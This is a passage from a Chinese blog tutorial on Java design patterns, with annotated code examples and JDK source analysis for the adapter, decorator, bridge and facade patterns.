class="keyword">public</span> String <span class="title">readSD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;adapter read tf card &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> readTF();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeSD</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;adapter write tf card&quot;</span>);</span><br><span class="line">        writeTF(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Computer computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        SDCard sdCard = <span class="keyword">new</span> SDCardImpl();</span><br><span class="line">        System.out.println(computer.readSD(sdCard));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SDAdapterTF adapter = <span class="keyword">new</span> SDAdapterTF();</span><br><span class="line">        System.out.println(computer.readSD(adapter));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类适配器模式违背了合成复用原则。类适配器是客户类有一个接口规范的情况下可用，反之不可用。</p>
<h5 id="对象适配器模式"><a href="#对象适配器模式" class="headerlink" title="对象适配器模式"></a>对象适配器模式</h5><p>实现方式：对象适配器模式可釆用将现有组件库中已经实现的组件引入适配器类中，该类同时实现当前系统的业务接口。</p>
<p>【例】读卡器</p>
<p>我们使用对象适配器模式将读卡器的案例进行改写。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-18-18-12-21.png" style="zoom:80%;" />

<p>代码如下：</p>
<p>类适配器模式的代码，我们只需要修改适配器类（SDAdapterTF）和测试类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建适配器对象（SD兼容TF）</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SDAdapterTF</span>  <span class="keyword">implements</span> <span class="title">SDCard</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TFCard tfCard;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SDAdapterTF</span><span class="params">(TFCard tfCard)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.tfCard = tfCard;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readSD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;adapter read tf card &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> tfCard.readTF();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeSD</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;adapter write tf card&quot;</span>);</span><br><span class="line">        tfCard.writeTF(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Computer computer = <span class="keyword">new</span> Computer();</span><br><span class="line">        SDCard sdCard = <span class="keyword">new</span> SDCardImpl();</span><br><span class="line">        System.out.println(computer.readSD(sdCard));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TFCard tfCard = <span class="keyword">new</span> TFCardImpl();</span><br><span class="line">        SDAdapterTF adapter = <span class="keyword">new</span> SDAdapterTF(tfCard);</span><br><span class="line">        System.out.println(computer.readSD(adapter));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：还有一个适配器模式是<strong>接口适配器模式</strong>。当不希望实现一个接口中所有的方法时，可以创建一个抽象类Adapter ，实现所有方法。而此时我们只需要继承该抽象类即可。</p>
</blockquote>
<p><strong>应用场景</strong></p>
<ul>
<li>以前开发的系统存在满足新系统功能需求的类，但其接口同新系统的接口不一致。</li>
<li>使用第三方提供的组件，但组件接口定义和自己要求的接口定义不同。</li>
</ul>
<h5 id="JDK源码解析"><a href="#JDK源码解析" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p>Reader（字符流）、InputStream（字节流）的适配使用的是InputStreamReader。</p>
<p>InputStreamReader继承自java.io包中的Reader，对他中的抽象的未实现的方法给出实现。如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sd.read();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">char</span> cbuf[], <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> sd.read(cbuf, offset, length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如上代码中的sd（StreamDecoder类对象），在Sun的JDK实现中，实际的方法实现是对sun.nio.cs.StreamDecoder类的同名方法的调用封装。类结构图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-18-18-11-41.png" style="zoom:80%;" />

<p>从上图可以看出：</p>
<ul>
<li>InputStreamReader是对同样实现了Reader的StreamDecoder的封装。</li>
<li>StreamDecoder不是Java SE API中的内容，是Sun  JDK给出的自身实现。但我们知道他们对构造方法中的字节流类（InputStream）进行封装，并通过该类进行了字节流和字符流之间的解码转换。</li>
</ul>
<p><font color="red">结论：</font></p>
<p>​    从表层来看，InputStreamReader做了InputStream字节流类到Reader字符流之间的转换。而从如上Sun JDK中的实现类关系结构中可以看出，是StreamDecoder的设计实现在实际上采用了适配器模式。</p>
<h4 id="装饰者模式"><a href="#装饰者模式" class="headerlink" title="装饰者模式"></a>装饰者模式</h4><p><strong>概述</strong></p>
<p>我们先来看一个快餐店的例子。</p>
<p>快餐店有炒面、炒饭这些快餐，可以额外附加鸡蛋、火腿、培根这些配菜，当然加配菜需要额外加钱，每个配菜的价钱通常不太一样，那么计算总价就会显得比较麻烦。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-14-51-06.png" style="zoom:50%;" />

<p>使用继承的方式存在的问题：</p>
<ul>
<li><p>扩展性不好</p>
<p>如果要再加一种配料（火腿肠），我们就会发现需要给FriedRice和FriedNoodles分别定义一个子类。如果要新增一个快餐品类（炒河粉）的话，就需要定义更多的子类。</p>
</li>
<li><p>产生过多的子类</p>
</li>
</ul>
<p><strong>定义：</strong></p>
<p>​    指在不改变现有对象结构的情况下，动态地给该对象增加一些职责（即增加其额外功能）的模式。</p>
<p><strong>结构</strong></p>
<p>装饰（Decorator）模式中的角色：</p>
<ul>
<li>抽象构件（Component）角色 ：定义一个抽象接口以规范准备接收附加责任的对象。</li>
<li>具体构件（Concrete  Component）角色 ：实现抽象构件，通过装饰角色为其添加一些职责。</li>
<li>抽象装饰（Decorator）角色 ： 继承或实现抽象构件，并包含具体构件的实例，可以通过其子类扩展具体构件的功能。</li>
<li>具体装饰（ConcreteDecorator）角色 ：实现抽象装饰的相关方法，并给具体构件对象添加附加的责任。</li>
</ul>
<p><strong>案例</strong></p>
<p>我们使用装饰者模式对快餐店案例进行改进，体会装饰者模式的精髓。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-16-25-28.png" style="zoom:75%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//快餐接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FastFood</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">float</span> price;</span><br><span class="line">    <span class="keyword">private</span> String desc;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastFood</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastFood</span><span class="params">(<span class="keyword">float</span> price, String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPrice</span><span class="params">(<span class="keyword">float</span> price)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDesc</span><span class="params">(String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span></span>;  <span class="comment">//获取价格</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//炒饭</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FriedRice</span> <span class="keyword">extends</span> <span class="title">FastFood</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FriedRice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="number">10</span>, <span class="string">&quot;炒饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getPrice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//炒面</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FriedNoodles</span> <span class="keyword">extends</span> <span class="title">FastFood</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FriedNoodles</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="number">12</span>, <span class="string">&quot;炒面&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getPrice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配料类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Garnish</span> <span class="keyword">extends</span> <span class="title">FastFood</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FastFood fastFood;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FastFood <span class="title">getFastFood</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fastFood;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFastFood</span><span class="params">(FastFood fastFood)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.fastFood = fastFood;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Garnish</span><span class="params">(FastFood fastFood, <span class="keyword">float</span> price, String desc)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(price,desc);</span><br><span class="line">        <span class="keyword">this</span>.fastFood = fastFood;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//鸡蛋配料</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Egg</span> <span class="keyword">extends</span> <span class="title">Garnish</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Egg</span><span class="params">(FastFood fastFood)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(fastFood,<span class="number">1</span>,<span class="string">&quot;鸡蛋&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getPrice() + getFastFood().getPrice();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getDesc() + getFastFood().getDesc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//培根配料</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bacon</span> <span class="keyword">extends</span> <span class="title">Garnish</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bacon</span><span class="params">(FastFood fastFood)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>(fastFood,<span class="number">2</span>,<span class="string">&quot;培根&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getPrice() + getFastFood().getPrice();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDesc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getDesc() + getFastFood().getDesc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//点一份炒饭</span></span><br><span class="line">        FastFood food = <span class="keyword">new</span> FriedRice();</span><br><span class="line">        <span class="comment">//花费的价格</span></span><br><span class="line">        System.out.println(food.getDesc() + <span class="string">&quot; &quot;</span> + food.cost() + <span class="string">&quot;元&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;========&quot;</span>);</span><br><span class="line">        <span class="comment">//点一份加鸡蛋的炒饭</span></span><br><span class="line">        FastFood food1 = <span class="keyword">new</span> FriedRice();</span><br><span class="line"></span><br><span class="line">        food1 = <span class="keyword">new</span> Egg(food1);</span><br><span class="line">        <span class="comment">//花费的价格</span></span><br><span class="line">        System.out.println(food1.getDesc() + <span class="string">&quot; &quot;</span> + food1.cost() + <span class="string">&quot;元&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;========&quot;</span>);</span><br><span class="line">        <span class="comment">//点一份加培根的炒面</span></span><br><span class="line">        FastFood food2 = <span class="keyword">new</span> FriedNoodles();</span><br><span class="line">        food2 = <span class="keyword">new</span> Bacon(food2);</span><br><span class="line">        <span class="comment">//花费的价格</span></span><br><span class="line">        System.out.println(food2.getDesc() + <span class="string">&quot; &quot;</span> + food2.cost() + <span class="string">&quot;元&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>好处：</strong></p>
<ul>
<li><p>饰者模式可以带来比继承更加灵活性的扩展功能，使用更加方便，可以通过组合不同的装饰者对象来获取具有不同行为状态的多样化的结果。装饰者模式比继承更具良好的扩展性，完美的遵循开闭原则，继承是静态的附加责任，装饰者则是动态的附加责任。</p>
</li>
<li><p>装饰类和被装饰类可以独立发展，不会相互耦合，装饰模式是继承的一个替代模式，装饰模式可以动态扩展一个实现类的功能。</p>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li><p>当不能采用继承的方式对系统进行扩充或者采用继承不利于系统扩展和维护时。</p>
<p>不能采用继承的情况主要有两类：</p>
<ul>
<li>第一类是系统中存在大量独立的扩展，为支持每一种组合将产生大量的子类，使得子类数目呈爆炸性增长；</li>
<li>第二类是因为类定义不能继承（如final类）</li>
</ul>
</li>
<li><p>在不影响其他对象的情况下，以动态、透明的方式给单个对象添加职责。</p>
</li>
<li><p>当对象的功能要求可以动态地添加，也可以再动态地撤销时。</p>
</li>
</ul>
<h5 id="JDK源码解析-1"><a href="#JDK源码解析-1" class="headerlink" title="JDK源码解析"></a>JDK源码解析</h5><p>IO流中的包装类使用到了装饰者模式。BufferedInputStream，BufferedOutputStream，BufferedReader，BufferedWriter。</p>
<p>我们以BufferedWriter举例来说明，先看看如何使用BufferedWriter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建BufferedWriter对象</span></span><br><span class="line">        <span class="comment">//创建FileWriter对象</span></span><br><span class="line">        FileWriter fw = <span class="keyword">new</span> FileWriter(<span class="string">&quot;C:\\Users\\Think\\Desktop\\a.txt&quot;</span>);</span><br><span class="line">        BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(fw);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写数据</span></span><br><span class="line">        bw.write(<span class="string">&quot;hello Buffered&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用起来感觉确实像是装饰者模式，接下来看它们的结构：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-20-16-20-08.png" style="zoom:80%;" />

<blockquote>
<p><font color="red">小结：</font></p>
<p>BufferedWriter使用装饰者模式对Writer子实现类进行了增强，添加了缓冲区，提高了写数据的效率。</p>
</blockquote>
<h5 id="代理和装饰者的区别"><a href="#代理和装饰者的区别" class="headerlink" title="代理和装饰者的区别"></a>代理和装饰者的区别</h5><p>静态代理和装饰者模式的区别：</p>
<ul>
<li>相同点：<ul>
<li>都要实现与目标类相同的业务接口</li>
<li>在两个类中都要声明目标对象</li>
<li>都可以在不修改目标类的前提下增强目标方法</li>
</ul>
</li>
<li>不同点：<ul>
<li><strong>目的不同</strong><br>装饰者是为了增强目标对象<br>静态代理是为了保护和隐藏目标对象</li>
<li><strong>获取目标对象构建的地方不同</strong><br>装饰者是由外界传递进来，可以通过构造方法传递<br>静态代理是在代理类内部创建，以此来隐藏目标对象</li>
</ul>
</li>
</ul>
<h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><p><strong>概述</strong></p>
<p>现在有一个需求，需要创建不同的图形，并且每个图形都有可能会有不同的颜色。我们可以利用继承的方式来设计类的关系：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-10-07.png" style="zoom:80%;" />

<p>我们可以发现有很多的类，假如我们再增加一个形状或再增加一种颜色，就需要创建更多的类。</p>
<p>试想，在一个有多种可能会变化的维度的系统中，用继承方式会造成类爆炸，扩展起来不灵活。每次在一个维度上新增一个具体实现都要增加多个子类。为了更加灵活的设计系统，我们此时可以考虑使用桥接模式。</p>
<p><strong>定义：</strong>将抽象与实现分离，使它们可以独立变化。它是用组合关系代替继承关系来实现，从而降低了抽象和实现这两个可变维度的耦合度。</p>
<p><strong>结构</strong></p>
<p>桥接（Bridge）模式包含以下主要角色：</p>
<ul>
<li>抽象化（Abstraction）角色 ：定义抽象类，并包含一个对实现化对象的引用。</li>
<li>扩展抽象化（Refined  Abstraction）角色 ：是抽象化角色的子类，实现父类中的业务方法，并<strong>通过组合关系调用实现化角色中的业务方法</strong>。</li>
<li>实现化（Implementor）角色 ：定义实现化角色的接口，供扩展抽象化角色调用。</li>
<li>具体实现化（Concrete Implementor）角色 ：给出实现化角色接口的具体实现。</li>
</ul>
<p><strong>案例</strong></p>
<p>【例】视频播放器</p>
<p>需要开发一个跨平台视频播放器，可以在不同操作系统平台（如Windows、Mac、Linux等）上播放多种格式的视频文件，常见的视频格式包括RMVB、AVI、WMV等。该播放器包含了两个维度，适合使用桥接模式。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-15-05.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//视频文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">VideoFile</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(String fileName)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//avi文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AVIFile</span> <span class="keyword">implements</span> <span class="title">VideoFile</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decode</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;avi视频文件：&quot;</span>+ fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//rmvb文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">REVBBFile</span> <span class="keyword">implements</span> <span class="title">VideoFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">decode</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;rmvb文件：&quot;</span> + fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//操作系统版本</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OperatingSystemVersion</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> VideoFile videoFile;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">OperatingSystemVersion</span><span class="params">(VideoFile videoFile)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.videoFile = videoFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(String fileName)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Windows版本</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">OperatingSystem</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Windows</span><span class="params">(VideoFile videoFile)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(videoFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">        videoFile.decode(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mac版本</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mac</span> <span class="keyword">extends</span> <span class="title">OperatingSystemVersion</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Mac</span><span class="params">(VideoFile videoFile)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(videoFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(String fileName)</span> </span>&#123;</span><br><span class="line">		videoFile.decode(fileName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        OperatingSystem os = <span class="keyword">new</span> Windows(<span class="keyword">new</span> AVIFile());</span><br><span class="line">        os.play(<span class="string">&quot;战狼3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>好处：</strong></p>
<ul>
<li><p>桥接模式提高了系统的可扩充性，在两个变化维度中任意扩展一个维度，都不需要修改原有系统。</p>
<p>如：如果现在还有一种视频文件类型wmv，我们只需要再定义一个类实现VideoFile接口即可，其他类不需要发生变化。</p>
</li>
<li><p>实现细节对客户透明</p>
</li>
</ul>
<h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li>当==一个类存在两个独立变化的维度，且这两个维度都需要进行扩展时==。</li>
<li>当一个系统不希望使用继承或因为多层次继承导致系统类的个数急剧增加时。</li>
<li>当一个系统需要在构件的抽象化角色和具体化角色之间增加更多的灵活性时。避免在两个层次之间建立静态的继承联系，通过桥接模式可以使它们在抽象层建立一个关联关系。</li>
</ul>
<h4 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h4><p><strong>概述</strong></p>
<p>有些人可能炒过股票，但其实大部分人都不太懂，这种没有足够了解证券知识的情况下做股票是很容易亏钱的，刚开始炒股肯定都会想，如果有个懂行的帮帮手就好，其实基金就是个好帮手，支付宝里就有许多的基金，它将投资者分散的资金集中起来，交由专业的经理人进行管理，投资于股票、债券、外汇等领域，而基金投资的收益归持有者所有，管理机构收取一定比例的托管管理费用。</p>
<p><strong>定义：</strong></p>
<p>​    又名门面模式，是一种通过为多个复杂的子系统提供一个一致的接口，而使这些子系统更加容易被访问的模式。该模式对外有一个统一接口，外部应用程序不用关心内部子系统的具体的细节，这样会大大降低应用程序的复杂度，提高了程序的可维护性。</p>
<p>​    外观（Facade）模式是“迪米特法则”的典型应用</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-33-12.jpg"></p>
<p><strong>结构</strong></p>
<p>外观（Facade）模式包含以下主要角色：</p>
<ul>
<li>外观（Facade）角色：为多个子系统对外提供一个共同的接口。</li>
<li>子系统（Sub System）角色：实现系统的部分功能，客户可以通过外观角色访问它。</li>
</ul>
<p><strong>案例</strong></p>
<p>【例】智能家电控制</p>
<p>小明的爷爷已经60岁了，一个人在家生活：每次都需要打开灯、打开电视、打开空调；睡觉时关闭灯、关闭电视、关闭空调；操作起来都比较麻烦。所以小明给爷爷买了智能音箱，可以通过语音直接控制这些智能家电的开启和关闭。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-19-15-36-46.png" style="zoom:80%;" />

<p>代码如下：</p>
